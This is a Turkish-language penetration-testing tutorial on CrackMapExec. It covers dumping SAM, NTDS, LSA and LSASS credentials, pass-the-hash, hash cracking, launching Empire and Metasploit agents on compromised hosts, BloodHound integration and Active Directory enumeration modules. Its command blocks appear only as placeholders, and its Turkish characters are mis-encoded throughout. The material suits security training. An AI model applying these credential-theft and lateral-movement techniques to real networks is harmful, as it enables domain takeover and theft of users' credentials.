Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


